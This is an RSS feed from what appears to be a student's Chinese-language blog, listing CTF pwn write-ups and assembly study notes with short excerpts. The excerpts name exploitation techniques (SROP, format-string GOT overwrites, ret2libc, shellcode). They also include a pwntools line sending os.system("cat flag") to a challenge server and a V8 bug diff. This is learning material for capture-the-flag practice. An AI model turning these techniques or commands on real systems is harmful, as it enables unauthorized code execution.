(chuj)</author><guid>https://chujdk.github.io/pwnreview/11%E6%9C%88%E5%9B%9E%E9%A1%BE.html</guid><description>之所以会写这一篇回顾是因为堆漏洞我还是学不进去，就先做一些体力劳动。 总体来讲11月在pwn上的成果我还是比较满意的，基本上做到了一天一题，栈</description></item><item><title>srop总结</title><link>https://chujdk.github.io/wp/srop%E6%80%BB%E7%BB%93.html</link><pubDate>Sat, 28 Nov 2020 19:13:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/srop%E6%80%BB%E7%BB%93.html</guid><description>srop技术，是一种利用sigreturn系统调用（主要是Linux在信号处理时为了保存进程上下文而使用的）来修改寄存器的技术。ctfwik</description></item><item><title>BUU-ciscn_2019_es_7-WP</title><link>https://chujdk.github.io/wp/buu-ciscn_2019_es_7-wp.html</link><pubDate>Sat, 28 Nov 2020 18:56:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-ciscn_2019_es_7-wp.html</guid><description>这是一道国赛题，当然做之前我还不知道，到了我发现我不会做的时候才知道..这也是我做的第一道srop，虽然wp发的是三道里面最晚的，做完roo</description></item><item><title>BUU-rootersctf_2019_srop-WP</title><link>https://chujdk.github.io/wp/buu-rootersctf_2019_srop-wp.html</link><pubDate>Sat, 28 Nov 2020 18:17:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-rootersctf_2019_srop-wp.html</guid><description>只开了NX，只存在syscall的gadgets，基本上就是srop了。无非就是做两件事，注入"/bin/sh\x00"和执行execve的</description></item><item><title>BUU-actf_2019_onerepeater-WP</title><link>https://chujdk.github.io/wp/buu-actf_2019_onerepeater-wp.html</link><pubDate>Sat, 28 Nov 2020 13:43:40 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-actf_2019_onerepeater-wp.html</guid><description>这是一道简单的格式化字符串和ret2shellcode的题目。 没开nx基本上是shellcode了。 我们就可以知道，程序直接输出了栈地址，还</description></item><item><title>BUU-360chunqiu2017_smallest-WP</title><link>https://chujdk.github.io/wp/buu-360chunqiu2017_smallest-wp.html</link><pubDate>Sat, 28 Nov 2020 10:28:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-360chunqiu2017_smallest-wp.html</guid><description>这篇博客写了两天，我也花了很久来理解srop，现在我可以说我会srop了。 这道题的代码非常短 xor rax, rax mov edx, 400h ; count mov rsi, rsp ; buf mov rdi, rax ; fd syscall ; LINUX - sys_read retn</description></item><item><title>BUU-inndy_echo2-WP</title><link>https://chujdk.github.io/wp/buu-inndy_echo2-wp.html</link><pubDate>Wed, 25 Nov 2020 14:40:53 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-inndy_echo2-wp.html</guid><description>这是一道非常好的题目，我做完之后很有收获。 从安全措施上来看，本题开启了PIE，没开canary（虽然实际上开与不开是不影响这道题的） 这道题和</description></item><item><title>BUU-inndy_echo-WP</title><link>https://chujdk.github.io/wp/buu-inndy_echo-wp.html</link><pubDate>Tue, 24 Nov 2020 18:55:50 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-inndy_echo-wp.html</guid><description>一道简单的hijack got，我做了一下午，原因是"%7$hn"写成了"$7hn"，说到底来还是不熟练。 存在明显的格式化字符串漏洞。我们考虑</description></item><item><title>BUU-picoctf_2018_can_you_gets_me-WP</title><link>https://chujdk.github.io/wp/buu-picoctf_2018_can_you_gets_me-wp.html</link><pubDate>Tue, 24 Nov 2020 14:00:50 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-picoctf_2018_can_you_gets_me-wp.html</guid><description>这道题目是比较简单的，但是如果不仔细看的话就会出大事。 先检查一下安全措施，可能会注意到使用的命令有变化，这是以为我用的是最新版的checks</description></item><item><title>再谈WSL——pwn的环境配置和wsl2的换源</title><link>https://chujdk.github.io/mess/%E5%86%8D%E8%B0%88wsl.html</link><pubDate>Tue, 24 Nov 2020 11:13:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/%E5%86%8D%E8%B0%88wsl.html</guid><description>过去幼稚的我选择使用 wsl2 作为研究环境，着实是打开了一个黑魔法的大门，然后还写了篇博客来推广黑魔法。在自己弃用 wsl 许久后也没有删除这篇文章，在这里</description></item><item><title>BUU-mrctf2020_shellcode_revenge-WP(可见字符shellcode)</title><link>https://chujdk.github.io/wp/buu-mrctf2020_shellcode_revenge-wp%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode.html</link><pubDate>Mon, 23 Nov 2020 14:26:11 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-mrctf2020_shellcode_revenge-wp%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode.html</guid><description>这道题大概又是以为call了rax所以无法F5，不过这个的关系倒是不大，代码逻辑还是好理解的 我们要做的就是执行到右边的语句，为了执行右边我们</description></item><item><title>学习 pwn 的过程中的一点心得</title><link>https://chujdk.github.io/pwnreview/%E6%88%91%E7%9A%84pwn%E5%BF%83%E5%BE%97.html</link><pubDate>Sat, 21 Nov 2020 22:01:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/%E6%88%91%E7%9A%84pwn%E5%BF%83%E5%BE%97.html</guid><description>值得注意的东西 与exp的动调 在 exp 中先指定 terminal，即添加一句 context.terminal = [&amp;#39;tmux&amp;#39;,&amp;#39;splitw&amp;#39;,&amp;#39;-h&amp;#39;] 然后在创建进程变量后，添加 gdb.attach(proc.pidof(sh)[0]) #这里的sh是进程变量 这样调试时先打开</description></item><item><title>BUU-picoctf_2018_shellcode-WP</title><link>https://chujdk.github.io/wp/buu-picoctf_2018_shellcode-wp.html</link><pubDate>Sat, 21 Nov 2020 21:59:50 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-picoctf_2018_shellcode-wp.html</guid><description>这道题的源程序有700多K，看起来非常大，但是打开之后发现实际上只有两个函数是有用的，即main和vuln。 但是由于不明原因（也许是函数太多</description></item><item><title>BUU-cmcc_pwnme2-WP</title><link>https://chujdk.github.io/wp/buu-cmcc_pwnme2-wp.html</link><pubDate>Sat, 21 Nov 2020 16:29:25 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-cmcc_pwnme2-wp.html</guid><description>此题，无canary，有gets溢出，偏移为0x6C+0x4，这个时候其实怎么样都能做，大不了ret2csu然后用DynELF爆破，shel</description></item><item><title>BUU-picoctf_2018_got_shell-WP</title><link>https://chujdk.github.io/wp/buu-picoctf_2018_got_shell-wp.html</link><pubDate>Sat, 21 Nov 2020 15:09:28 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-picoctf_2018_got_shell-wp.html</guid><description>很简单的hijack GOT，我们只要将puts的GOT表值换位win函数的起始地址就行了</description></item><item><title>BUU-jarvisoj_level5-WP</title><link>https://chujdk.github.io/wp/buu-jarvisoj_level5-wp.html</link><pubDate>Sat, 21 Nov 2020 08:34:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-jarvisoj_level5-wp.html</guid><description>写这篇wp纯粹是证明一下我这两天有做题，这道题是ret2csu和DynELF的使用，而且也没什么特殊的地方，就直接上exp了。 不过还是有一点</description></item><item><title>BUU-hgame2018_flag_server-WP</title><link>https://chujdk.github.io/wp/buu-hgame2018_flag_server-wp.html</link><pubDate>Thu, 19 Nov 2020 12:22:23 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-hgame2018_flag_server-wp.html</guid><description>其实这道题之前还做了一道srop，但是其实我还没有完全理解，所以那个的wp就得先搁一下，先写这个的。 这道题很简单 这个if是一定会执行的，我们</description></item><item><title>BUU-wustctf2020_closed-WP</title><link>https://chujdk.github.io/wp/buu-wustctf2020_closed-wp.html</link><pubDate>Tue, 17 Nov 2020 16:23:57 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-wustctf2020_closed-wp.html</guid><description>这道题考的其实不是pwn，应该说是Linux系统编程的知识。 我啥都不会，看了别人的wp之后才知道一点。 这个函数close了标准输出(clos</description></item><item><title>四篇WP连写</title><link>https://chujdk.github.io/wp/lotswp.html</link><pubDate>Tue, 17 Nov 2020 11:57:52 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/lotswp.html</guid><description>今天是快乐的pwn水题的一天，xctf上已经没有我会做的题了，做起了BUU的题。 test_your_nc 用nc连上，cat flag就行了.. pwn1_sctf_2016 说实话这道题我没怎么</description></item><item><title>做一个安排</title><link>https://chujdk.github.io/mess/%E5%81%9A%E4%B8%80%E4%B8%AA%E5%AE%89%E6%8E%92.html</link><pubDate>Sun, 15 Nov 2020 16:18:12 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/%E5%81%9A%E4%B8%80%E4%B8%AA%E5%AE%89%E6%8E%92.html</guid><description>近期总是无所事事，做一下todo list 复习数分高代准备英语四级学习堆的漏洞希望能完成malloc lab完善plot</description></item><item><title>XCTF-实时数据监测-WP</title><link>https://chujdk.github.io/wp/xctf-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B-wp.html</link><pubDate>Sat, 14 Nov 2020 20:06:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B-wp.html</guid><description>span 这道题的WP，怎么说呢，我是真不想写，就是一道签到的水题。漏洞为格式化字符串漏洞，通过覆盖任意地址漏洞来拿shell。直接上exp吧。 红框</description></item><item><title>格式化字符串——以printf为代表</title><link>https://chujdk.github.io/pwnreview/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%A5printf%E4%B8%BA%E4%BB%A3%E8%A1%A8.html</link><pubDate>Sat, 14 Nov 2020 16:05:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%A5printf%E4%B8%BA%E4%BB%A3%E8%A1%A8.html</guid><description>span 首先我想说，格式化字符串漏洞，会出现再形如printf(&amp;s);这样的语句中，如果输出的参数等与输入有关，那么，就可能会自然的使用这样的方</description></item><item><title>XCTF-greeting-150-WP</title><link>https://chujdk.github.io/wp/xctf-greeting-150-wp.html</link><pubDate>Sat, 14 Nov 2020 14:47:41 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-greeting-150-wp.html</guid><description>在前天连水pwn三道后我就一直在浪费时间，本来是想先把堆学掉，但是发现是在是有点复杂，想把cs:app的malloc lab和free lab完</description></item><item><title>XCTF-反应釜开关控制-WP</title><link>https://chujdk.github.io/wp/xctf-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6-wp.html</link><pubDate>Thu, 12 Nov 2020 19:46:41 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6-wp.html</guid><description>这道题目是简单的ret2text，直接上payload吧</description></item><item><title>XCTF-warmup-WP</title><link>https://chujdk.github.io/wp/xctf-warmup-wp.html</link><pubDate>Thu, 12 Nov 2020 09:35:40 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-warmup-wp.html</guid><description>这是一道我应该在很久以前做的水题，但是xctf上一直没有源程序，现在我发现在BUUCTF上有源程序，所以就做了一下。 什么都没开 gets存在溢</description></item><item><title>XCTF-monkey-WP</title><link>https://chujdk.github.io/wp/xctf-monkey-wp.html</link><pubDate>Thu, 12 Nov 2020 09:23:24 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-monkey-wp.html</guid><description>这道题拿到的时候发现有20多兆，但是看名字像js的解释器，启动程序之后发现就是，所以直接连接cat flag就行了... from pwn import * sh = remote("220.249.52.133","****") sh.sendline("os.system(\"cat flag\")") sh.interactive() 开</description></item><item><title>XCTF-welpwn-WP</title><link>https://chujdk.github.io/wp/xctf-welpwn-wp.html</link><pubDate>Tue, 10 Nov 2020 11:35:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-welpwn-wp.html</guid><description>这道题非常的有意思。知识点很简单，就是无libc的ret2libc，最近已经做了两道了。不过这题有一点小限制，需要有一点特殊的处理。 我们直接</description></item><item><title>XCTF-pwn-200-WP</title><link>https://chujdk.github.io/wp/xctf-pwn-200-wp.html</link><pubDate>Mon, 09 Nov 2020 14:48:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-pwn-200-wp.html</guid><description>这是一道很简单的题目，算是无libc的ret2libc，但是有很多我不理解的小细节还需要加强学习。 先检查一下安全措施 发现没有开启canary</description></item><item><title>XCTF-pwn-100-WP</title><link>https://chujdk.github.io/wp/xctf-pwn-100-wp.html</link><pubDate>Sat, 07 Nov 2020 21:57:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-pwn-100-wp.html</guid><description>这道题对我而言有两个新知识点，中级rop——ret2csu和DynELF工具的使用。同时这道题也做了我非常久，让我心态有点小崩。为啥会做这么</description></item><item><title>XCTF-pwn1-WP</title><link>https://chujdk.github.io/wp/xctf-pwn1-wp.html</link><pubDate>Thu, 05 Nov 2020 23:18:18 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-pwn1-wp.html</guid><description>今天的课特别的多，没有多少的空闲时间，原本可以做题的C程课也被写一个愚蠢的排序测试程序占用了。 其实今天没有做完这道题，因为服务器维护了，但是</description></item><item><title>XCTF-stack2-WP</title><link>https://chujdk.github.io/wp/xctf-stack2.html</link><pubDate>Wed, 04 Nov 2020 21:59:33 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-stack2.html</guid><description>这道题确实是给我整吐了。其实思路非常简单，就是通过数组越界来达到栈溢出，并且这样可以跨越canary，然后就可以控制程序的执行流程。 然后我们</description></item><item><title>XCTF-dice_game WP</title><link>https://chujdk.github.io/wp/xctf-dice_game-wp.html</link><pubDate>Tue, 03 Nov 2020 20:47:51 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-dice_game-wp.html</guid><description>本来呢，是准备做warmup这道题的，但是这道题非常的夸张， 我曾经天真的以为，这是一道直接连接服务器就可以拿flag的，结果发现一上来他就给</description></item><item><title>XCTF-Mary_Morton WP</title><link>https://chujdk.github.io/wp/mary_morton.html</link><pubDate>Tue, 03 Nov 2020 14:28:37 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/mary_morton.html</guid><description>这是一道格式化字符串和栈溢出结合的题目，也是我第一次smash了canary：） 发现有canary和栈不可执行。 然后到IDA里面看一下 我们发</description></item><item><title>XCTF-forgot WP</title><link>https://chujdk.github.io/wp/forgot-wp.html</link><pubDate>Mon, 02 Nov 2020 20:33:03 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/forgot-wp.html</guid><description>这是我做的第一道处于进阶区pwn题。 checksec查看安全保护 中规中矩 到ida里反汇编一下，shift+F12发现有这么一个函数 所以调用它</description></item><item><title>11.2记录</title><link>https://chujdk.github.io/mess/11-2%E8%AE%B0%E5%BD%95.html</link><pubDate>Mon, 02 Nov 2020 12:53:08 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/11-2%E8%AE%B0%E5%BD%95.html</guid><description>11月的第二天，今天准备做两道题：xctf的CGfsb（现在看来是格式化字符串）和hgame的brop（估摸着是ret2libc） 最后我做了</description></item><item><title>XCTF-level3 WP</title><link>https://chujdk.github.io/wp/xctf-level3.html</link><pubDate>Sat, 31 Oct 2020 18:20:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-level3.html</guid><description>今天花了一个下午写出来了这样一道ret2libc，题目确实只是一道简单的模板题，但是还是做了我很久，这篇write up也是记录一下 下载附件，</description></item><item><title>再回首</title><link>https://chujdk.github.io/mess/%E5%86%8D%E5%9B%9E%E9%A6%96.html</link><pubDate>Fri, 30 Oct 2020 21:34:52 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/%E5%86%8D%E5%9B%9E%E9%A6%96.html</guid><description>十月的尾巴上总结一下这个月做的事情。 本来觉得这个月每天都挺忙的，结果一看最后还是没做什么事情。最主要的成果就是花了一个星期学完了8086汇编</description></item><item><title>C语言函数调用栈</title><link>https://chujdk.github.io/pwnreview/c%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88.html</link><pubDate>Thu, 29 Oct 2020 21:10:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/c%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88.html</guid><description>span 注：接下来如无特殊说明，汇编语法都是intel语法，同时讨论的是 32 位的调用流程。64 位由于使用寄存器传参比较简单类比即可，这里不再讨论 前置</description></item><item><title>10.22汇编</title><link>https://chujdk.github.io/asm-learn/10-22%E6%B1%87%E7%BC%96.html</link><pubDate>Thu, 22 Oct 2020 13:38:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/10-22%E6%B1%87%E7%BC%96.html</guid><description>今天看完了int指令和端口，由于这些知识和32位的有一定区别，所以知识点就不列了，我也只是粗略的看了一下，做了一下实验而已 实验13 assume cs:code,ds:data data segment db</description></item><item><title>10.21汇编</title><link>https://chujdk.github.io/asm-learn/10-21%E6%B1%87%E7%BC%96.html</link><pubDate>Wed, 21 Oct 2020 22:48:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/10-21%E6%B1%87%E7%BC%96.html</guid><description>In These Arms 今天看了两章，下午由于一些事耽搁了，本来其实还可以看更多，但总体还是满意的 第十一章是讲标志寄存器，说实话这个感觉主要靠记，而我还真记不</description></item><item><title>10.20汇编</title><link>https://chujdk.github.io/asm-learn/10-20%E6%B1%87%E7%BC%96.html</link><pubDate>Tue, 20 Oct 2020 22:08:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/10-20%E6%B1%87%E7%BC%96.html</guid><description>实验7之后实验的代码量大幅提高，所以每章花费的时间也大幅提高了。上午只看完了第十章，会用函数了。晚上争取完成课程设计。 CALL和RET cal</description></item><item><title>10.19汇编</title><link>https://chujdk.github.io/asm-learn/10-19%E6%B1%87%E7%BC%96.html</link><pubDate>Mon, 19 Oct 2020 20:55:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/10-19%E6%B1%87%E7%BC%96.html</guid><description>I Don't Want to Miss a Thing (From Armageddon Soundtrack) 今天的进度还是比较令人满意的 实验7 今天主要的时间都花在这上面了，就这么几个寄存器卡来卡去，幸运的是最后还是达成了目的。 代</description></item><item><title>王爽《汇编语言》(第四版) 实验7</title><link>https://chujdk.github.io/asm-learn/%E7%8E%8B%E7%88%BD-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%AC%AC%E5%9B%9B%E7%89%88-%E5%AE%9E%E9%AA%8C7.html</link><pubDate>Mon, 19 Oct 2020 17:38:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/%E7%8E%8B%E7%88%BD-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%AC%AC%E5%9B%9B%E7%89%88-%E5%AE%9E%E9%AA%8C7.html</guid><description>这个实验确实是比较繁琐，而且我先是手写的代码，有很多考虑错误的地方，最后花了2个多小时才解决掉。 ;迄今为止最麻烦的程序 assume cs:code,es:table,ss:stack data segment db '1975','1976','1977','1978','1979','1980','1981','1982','1983' db '1984','1985','1986','1987','1988','1989','1990','1991','1992' db '1993','1994','1995' dd</description></item><item><title>10.18汇编</title><link>https://chujdk.github.io/asm-learn/10-18%E6%B1%87%E7%BC%96.html</link><pubDate>Sun, 18 Oct 2020 19:02:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/10-18%E6%B1%87%E7%BC%96.html</guid><description>Sweet Child O' Mine 写在笔记之前 今天一个上午都在做第5个实验，一方面是上午的时间比较少，另一方面也是这个实验的代码量增大。现在来看，我的汇编能力已经有了</description></item><item><title>王爽汇编语言第四版第六章实验源码</title><link>https://chujdk.github.io/asm-learn/%E7%8E%8B%E7%88%BD%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%AC%E5%9B%9B%E7%89%88%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%AE%9E%E9%AA%8C%E6%BA%90%E7%A0%81.html</link><pubDate>Sun, 18 Oct 2020 11:58:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/%E7%8E%8B%E7%88%BD%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%AC%E5%9B%9B%E7%89%88%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%AE%9E%E9%AA%8C%E6%BA%90%E7%A0%81.html</guid><description>assume cs:code,ds:data,ss:stack data segment dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h data ends stack segment dw 0,0,0,0,0,0,0,0 stack ends code segment start: mov ax,stack mov ss,ax mov sp,16 mov ax,data mov ds,ax push ds:[0] push ds:[2] pop ds:[2] pop ds:[0] mov ax,4c00h int 21h code ends end start assume cs:code,ds:data,ss:stack data segment dw 0123h,0456h,0123h,0456h,0123h,0456h,0123h,0456h,0123h,0456h,0123h,0456h,0123h,0456h,0123h,0456h stack segment dw 0,0 stack ends code segment start: mov ax,stack mov ss,ax mov sp,16 mov ax,data mov ds,ax push ds:[0]</description></item><item><title>10.17汇编</title><link>https://chujdk.github.io/asm-learn/10-17%E6%B1%87%E7%BC%96.html</link><pubDate>Sat, 17 Oct 2020 22:26:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/10-17%E6%B1%87%E7%BC%96.html</guid><description>November Rain 今天看了将近三章，效率还算不错 第四章过的很快，没什么特别的。 编译链接的过程 再强化一次，masm.exe:编译源代码，产生目标文件（.ob</description></item><item><title>10.16汇编</title><link>https://chujdk.github.io/asm-learn/10-16%E6%B1%87%E7%BC%96.html</link><pubDate>Fri, 16 Oct 2020 23:35:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/10-16%E6%B1%87%E7%BC%96.html</guid><description>some nights 今天的进度非常慢，到11点多才刚刚结束了第三章，总体不是很满意。 SS,SP和栈的故事 SS是另一种段寄存器（至今为止碰到的第3种，之前的是</description></item><item><title>近期的规划</title><link>https://chujdk.github.io/mess/%E8%BF%91%E6%9C%9F%E7%9A%84%E8%A7%84%E5%88%92.html</link><pubDate>Thu, 15 Oct 2020 22:23:14 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/%E8%BF%91%E6%9C%9F%E7%9A%84%E8%A7%84%E5%88%92.html</guid><description>想想还是有必要提前规划一下的，也算是督促一下自己 王爽的汇编语言，争取一天一章，从14号开始，大概就是在11月前完成，每天都开一篇博客记录一下</description></item><item><title>10.15汇编</title><link>https://chujdk.github.io/asm-learn/10-15-ass.html</link><pubDate>Thu, 15 Oct 2020 22:14:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/10-15-ass.html</guid><description>i remember you 今天只学习了2.12-3.5，进度稍微有一点落后，希望周末可以补回来 内存中字的存储 8086是16位的，显然一次可以处理16位的数据，虽</description></item><item><title>10.14-汇编</title><link>https://chujdk.github.io/asm-learn/10-14-ass.html</link><pubDate>Wed, 14 Oct 2020 22:07:37 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/10-14-ass.html</guid><description>high enough 今天主要看的是第一章和2.1-2.10，第一章是对硬件的一些介绍，总体上没什么可说的，第二章讲的是寄存器，比较值得记录的是物理地址=段地</description></item><item><title>open-source</title><link>https://chujdk.github.io/wp/open-source.html</link><pubDate>Tue, 13 Oct 2020 21:33:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/open-source.html</guid><description>打开获得一个C源文件 if (argc != 4) { printf("what?\n"); exit(1); } 这里说明要有4个参数（包括程序名在内） unsigned int first = atoi(argv[1]); if (first != 0xcafe) { printf("you are wrong, sorry.\n"); exit(2); } 这里说明第二个参数的十六进制形式为</description></item><item><title>Hello, CTF</title><link>https://chujdk.github.io/wp/hello-ctf.html</link><pubDate>Tue, 13 Oct 2020 21:11:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/hello-ctf.html</guid><description>下载附件得到一个应用程序，shell里面跑一下 用IDA打开，按F5反编译 这里可以看到，flag就是437261636b4d654a75737</description></item><item><title>汇编语言环境搭建</title><link>https://chujdk.github.io/asm-learn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</link><pubDate>Tue, 13 Oct 2020 17:03:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/asm-learn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</guid><description>今天花了很多钱买书，《汇编语言》《逆向工程核心原理》和《加密与解密》，花了这么多，不好好看的话，就很亏，所以写个博客防止自己走马观花，同时也</description></item><item><title>Linux(fedora) on U盘安装记</title><link>https://chujdk.github.io/mess/linuxfedora-on-u%E7%9B%98%E5%AE%89%E8%A3%85%E8%AE%B0.html</link><pubDate>Sun, 11 Oct 2020 12:33:48 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/linuxfedora-on-u%E7%9B%98%E5%AE%89%E8%A3%85%E8%AE%B0.html</guid><description>我的电脑很奇怪，打不开VMware的安装包，一点开就闪退掉，网络上也几乎没有发现类似的问题，只在贴吧上面看到过一个兄弟有一样的问题，但是也没</description></item><item><title>第一篇博客！！！</title><link>https://chujdk.github.io/mess/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2.html</link><pubDate>Sun, 11 Oct 2020 11:46:16 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2.html</guid><description>在九月买了阿里云的ecs服务器之后，我就开始着手博客的搭建，先是用宝塔完成了WP的部署，然而我发现这没有任何技术难度，想想又没有什么可以写的</description></item><item><title/><link>https://chujdk.github.io/404.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/404.html</guid><description>Oops! 404..
There is nothing in this page</description></item><item><title>XCTF-Final-hole-WP</title><link>https://chujdk.github.io/wp/16644.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/16644.html</guid><description>本文简述了 XCTF Final 2022 中的 pwn hole 一题的利用过程 Table of Contents 1 漏洞分析 2 漏洞利用 3 poc 4 rce 1 漏洞分析 先来看一下附带的 diff diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc index f6238e3072..17821d3124 100644 --- a/src/builtins/builtins-collections-gen.cc +++ b/src/builtins/builtins-collections-gen.cc @@ -1765,7 +1765,7 @@ TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) { &amp;#34;Map.prototype.delete&amp;#34;); //</description></item></channel></rss>